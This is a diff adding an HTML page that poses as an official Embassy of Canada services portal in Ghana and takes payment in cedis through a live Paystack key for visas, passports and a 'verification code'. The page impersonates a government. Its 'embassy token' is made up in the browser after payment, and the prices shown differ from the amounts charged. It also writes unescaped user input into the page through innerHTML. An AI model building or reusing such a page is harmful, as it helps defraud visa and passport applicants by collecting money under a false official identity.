@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Canada Embassy · secure Paystack payment</title>
+  <!-- Link to external CSS file -->
+  <link rel="stylesheet" href="styles.css">
+  <!-- Paystack inline JS (official) -->
+  <script src="https://js.paystack.co/v1/inline.js"></script> 
+</head>
+<body>
+  <!-- header – Canada Embassy official look -->
+  <header class="embassy-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <div class="flag-symbol">
+          <span>🍁</span>
+          <span>CANADA</span>
+        </div>
+        <div class="embassy-title">
+          <h1>
+            <strong>Embassy of Canada</strong> 
+            <span class="sub">Ghana · services portal</span>
+          </h1>
+        </div>
+      </div>
+      <div class="lang-selector">🌐 English | Français</div>
+    </div>
+    <nav class="nav-bar">
+      <div class="nav-container">
+        <a href="#" class="active">Home</a>
+        <a href="#">Visa & immigration</a>
+        <a href="#">Passport services</a>
+        <a href="#">Citizenship</a>
+        <a href="#">Notarial / verification</a>
+        <a href="#">Contact</a>
+      </div>
+    </nav>
+  </header>
+
+  <div class="main-container">
+    <!-- LEFT COLUMN – main application form -->
+    <div class="card">
+      <h2>Apply / purchase</h2>
+      <div class="badge">✅ Secure online service – Pay with Paystack (GHS)</div>
+      
+      <!-- service selection (customer can choose) -->
+      <p style="font-weight: 500; color:#153e63;">Select service(s):</p>
+      <div class="service-grid" id="serviceGrid">
+        <!-- verification code -->
+        <div class="service-item" data-service="verification" data-price="450">
+          <span class="service-icon">🔐</span>
+          <div class="service-info">
+            <h4>Embassy VERIFICATION code</h4>
+            <p>document authenticity code</p>
+          </div>
+          <span class="service-price">930 GHS</span>
+        </div>
+        <!-- birth certificate -->
+        <div class="service-item" data-service="birth" data-price="320">
+          <span class="service-icon">👶</span>
+          <div class="service-info">
+            <h4>Birth certificate</h4>
+            <p>certified copy</p>
+          </div>
+          <span class="service-price">320 GHS</span>
+        </div>
+        <!-- passport -->
+        <div class="service-item" data-service="passport" data-price="850">
+          <span class="service-icon">🛂</span>
+          <div class="service-info">
+            <h4>Passport (standard)</h4>
+            <p>24-page ePassport</p>
+          </div>
+          <span class="service-price">850 GHS</span>
+        </div>
+        <!-- visa application -->
+        <div class="service-item" data-service="visa" data-price="1200">
+          <span class="service-icon">✈️</span>
+          <div class="service-info">
+            <h4>Canada Visa (visit)</h4>
+            <p>including biometrics</p>
+          </div>
+          <span class="service-price">2,000 GHS</span>
+        </div>
+      </div>
+
+      <!-- customer information form -->
+      <div class="applicant-form">
+        <div class="form-row">
+          <label>Full name (as on passport)</label>
+          <input type="text" id="fullName" placeholder="Canada Embassy" value="Canada Embassy">
+        </div>
+        <div class="form-row" style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+          <div><label>Date of birth</label><input type="date" id="dob" value="1990-06-15"></div>
+          <div><label>Nationality</label><select id="nationality"><option>Ghanaian</option><option>Other</option></select></div>
+        </div>
+        <div class="form-row">
+          <label>Email address</label>
+          <input type="email" id="email" value="canadaembassy@gmail.com" placeholder="your@gmail.com">
+        </div>
+        <div class="form-row">
+          <label>Phone (Ghana)</label>
+          <input type="tel" id="phone" value="+233 30 000 0000" placeholder="+233 ...">
+        </div>
+      </div>
+
+      <!-- paystack / GHS payment section -->
+      <div class="payment-section" id="paymentBox">
+        <div class="payment-header">
+          <span>💳 Pay with Paystack (Live)</span>
+          <span class="paystake-badge">Ghana cedis</span>
+        </div>
+        <div class="currency-box">
+          <span class="cedi-symbol">₵ GHS</span>
+          <span class="total-amount" id="totalAmount">930.00</span>
+        </div>
+        <p style="font-size:0.85rem; margin-top:0.5rem;">⛓️ Secure 3D secure • total includes service fee</p>
+      </div>
+
+      <!-- Paystack real payment button -->
+      <button class="paystack-button" id="paystackRealBtn">
+        <span>💳 Pay with Paystack</span>
+      </button>
+
+      <!-- token output area (initially hidden, shown after successful payment) -->
+      <div id="tokenContainer" style="display: none;" class="token-result">
+        <span>✅ PAYMENT RECORDED / VERIFIED</span>
+        <div class="token-code" id="tokenDisplay">CA-XXXX-XX</div>
+        <div class="token-note">🔔 Your Embassy token – keep this code for verification</div>
+        <p style="margin-top: 0.8rem; font-size:0.8rem;">An email with details has been sent.</p>
+      </div>
+
+      <p style="font-size:0.75rem; color:#5e7e9c; margin-top: 1.5rem;">🏛️ Official payment portal. You will be redirected to Paystack secure page.</p>
+    </div>
+
+    <!-- RIGHT PANEL – summary & information -->
+    <div class="info-panel">
+      <h3> Your Details</h3>
+      <div class="customer-details-preview" id="customerPreview">
+        <div class="detail-item"><span>Name</span> <span>Canada Embassy</span></div>
+        <div class="detail-item"><span>DOB</span> <span>1990-06-15</span></div>
+        <div class="detail-item"><span>Email</span> <span>Canada.embassy@example.com</span></div>
+        <div class="detail-item"><span>Phone</span> <span>+233 30 000 0000</span></div>
+        <div class="detail-item"><span>Selected services</span> <span id="summaryServices">Verification code</span></div>
+        <div class="detail-item"><span>Total (GHS)</span> <span id="summaryTotal">930.00</span></div>
+      </div>
+      <div class="embassy-stamp">
+        <span>🏛️ High Commission of Canada <br> to Ghana</span><br>
+        <span style="font-size: 0.7rem;">42 Independence Ave, Accra</span>
+      </div>
+      <h3 style="margin-top: 1.8rem;">📋 Important</h3>
+      <ul style="margin-left: 1.2rem; color:#2f4858;">
+        <li>All fees must be paid in Ghana cedis.</li>
+        <li>You will receive a TOKEN after successful Paystack payment.</li>
+        <li>Bring token code to biometric appointment.</li>
+        <li>Verification codes are processed within 2 days.</li>
+      </ul>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2025 Embassy of Canada to Ghana. 42 Independence Ave, Accra.   Official information: canada.ca/ghana</p>
+    <p style="margin-top: 0.5rem;">🔒 Secure payment via Paystack Ghana | All amounts in GHS</p>
+  </footer>
+
+  <!-- separate JavaScript for interactivity + REAL Paystack integration -->
+  <script>
+    (function() {
+      // ====== CUSTOMER'S PAYSTACK PUBLIC KEY (REPLACE WITH YOUR OWN) ======
+      const PAYSTACK_PUBLIC_KEY = 'pk_live_322e5d5775eb0e9ad30e1ab3aa81ae5949c62127';  // <-- CHANGE THIS TO YOUR KEY
+
+      // DOM elements
+      const serviceItems = document.querySelectorAll('.service-item');
+      const totalSpan = document.getElementById('totalAmount');
+      const summaryServicesSpan = document.getElementById('summaryServices');
+      const summaryTotalSpan = document.getElementById('summaryTotal');
+      const fullNameInput = document.getElementById('fullName');
+      const dobInput = document.getElementById('dob');
+      const emailInput = document.getElementById('email');
+      const phoneInput = document.getElementById('phone');
+      const nationalitySelect = document.getElementById('nationality');
+      const customerPreview = document.getElementById('customerPreview');
+      const tokenContainer = document.getElementById('tokenContainer');
+      const tokenDisplay = document.getElementById('tokenDisplay');
+      const paystackBtn = document.getElementById('paystackRealBtn');
+
+      // selected services set
+      let selected = new Set(); 
+      // default select verification
+      const defaultSelect = document.querySelector('[data-service="verification"]');
+      if(defaultSelect) {
+        selected.add('verification');
+        defaultSelect.classList.add('selected');
+      }
+
+      // helper to update total and summary
+      function updateTotalAndSummary() {
+        let total = 0;
+        let names = [];
+        serviceItems.forEach(item => {
+          const service = item.dataset.service;
+          const price = parseFloat(item.dataset.price);
+          if (selected.has(service)) {
+            total += price;
+            names.push(item.querySelector('.service-info h4')?.innerText || service);
+          }
+        });
+        totalSpan.innerText = total.toFixed(2);
+        summaryTotalSpan.innerText = total.toFixed(2) + ' GHS';
+        summaryServicesSpan.innerText = names.length ? names.join(', ') : 'None selected';
+        updatePreview();
+      }
+
+      // update right panel preview with live data
+      function updatePreview() {
+        const name = fullNameInput.value.trim() || 'Samuel Mensah';
+        const dob = dobInput.value || '1990-06-15';
+        const email = emailInput.value.trim() || 'samuel.mensah@example.com';
+        const phone = phoneInput.value.trim() || '+233 24 123 4567';
+        customerPreview.innerHTML = `
+          <div class="detail-item"><span>Name</span> <span>${name}</span></div>
+          <div class="detail-item"><span>DOB</span> <span>${dob}</span></div>
+          <div class="detail-item"><span>Email</span> <span>${email}</span></div>
+          <div class="detail-item"><span>Phone</span> <span>${phone}</span></div>
+          <div class="detail-item"><span>Selected services</span> <span>${summaryServicesSpan.innerText}</span></div>
+          <div class="detail-item"><span>Total (GHS)</span> <span>${totalSpan.innerText}</span></div>
+        `;
+      }
+
+      // toggle service selection
+      serviceItems.forEach(item => {
+        item.addEventListener('click', function(e) {
+          const service = this.dataset.service;
+          if (selected.has(service)) {
+            selected.delete(service);
+            this.classList.remove('selected');
+          } else {
+            selected.add(service);
+            this.classList.add('selected');
+          }
+          updateTotalAndSummary();
+        });
+      });
+
+      // input listeners
+      fullNameInput.addEventListener('input', updatePreview);
+      dobInput.addEventListener('input', updatePreview);
+      emailInput.addEventListener('input', updatePreview);
+      phoneInput.addEventListener('input', updatePreview);
+      nationalitySelect.addEventListener('change', updatePreview);
+
+      // initial update
+      updateTotalAndSummary();
+
+      // ========== REAL PAYSTACK INTEGRATION ==========
+      paystackBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+
+        // validation
+        if (selected.size === 0) {
+          alert('Please select at least one service.');
+          return;
+        }
+        const fullName = fullNameInput.value.trim();
+        const email = emailInput.value.trim();
+        if (!fullName) {
+          alert('Please enter full name.');
+          return;
+        }
+        if (!email || !email.includes('@')) {
+          alert('Please enter a valid email address.');
+          return;
+        }
+        const phone = phoneInput.value.trim() || '+233000000000';
+
+        // calculate total in pesewas (Paystack uses smallest currency unit)
+        let totalGHS = 0;
+        serviceItems.forEach(item => {
+          if (selected.has(item.dataset.service)) {
+            totalGHS += parseFloat(item.dataset.price);
+          }
+        });
+        const amountInPesewas = Math.round(totalGHS * 100);  // 1 GHS = 100 pesewas
+
+        // generate a unique reference
+        const reference = 'CA-' + Date.now() + '-' + Math.floor(Math.random() * 1000000);
+
+        // metadata with customer info and selected services
+        const selectedServicesArray = [];
+        serviceItems.forEach(item => {
+          if (selected.has(item.dataset.service)) {
+            selectedServicesArray.push(item.querySelector('.service-info h4')?.innerText || item.dataset.service);
+          }
+        });
+
+        // Initialize Paystack popup
+        const handler = PaystackPop.setup({
+          key: PAYSTACK_PUBLIC_KEY,
+          email: email,
+          amount: amountInPesewas,
+          currency: 'GHS',
+          ref: reference,
+          metadata: {
+            custom_fields: [
+              { display_name: "Full Name", variable_name: "full_name", value: fullName },
+              { display_name: "Phone", variable_name: "phone", value: phone },
+              { display_name: "Date of Birth", variable_name: "dob", value: dobInput.value || 'N/A' },
+              { display_name: "Selected Services", variable_name: "services", value: selectedServicesArray.join(', ') }
+            ],
+            customer_name: fullName,
+            customer_phone: phone,
+            services: selectedServicesArray
+          },
+          callback: function(response) {
+            // Payment successful! response contains transaction reference
+            console.log('Paystack success:', response);
+
+            // Generate embassy token based on reference
+            const tokenRaw = response.reference || reference;
+            const tokenSuffix = tokenRaw.slice(-8).toUpperCase().replace(/[^A-Z0-9]/g, '');
+            const finalToken = 'CA-' + tokenSuffix.substring(0,4) + '-' + tokenSuffix.substring(4,8);
+
+            tokenDisplay.innerText = finalToken;
+            tokenContainer.style.display = 'block';
+
+            // Optionally disable button & change text
+            paystackBtn.disabled = true;
+            paystackBtn.innerHTML = '<span>✅ Payment complete</span>';
+
+            // scroll to token
+            tokenContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          },
+          onClose: function() {
+            alert('Payment window closed. You have not been charged.');
+          }
+        });
+
+        handler.openIframe();
+      });
+
+    })();
+  </script>
+</body>
+</html>
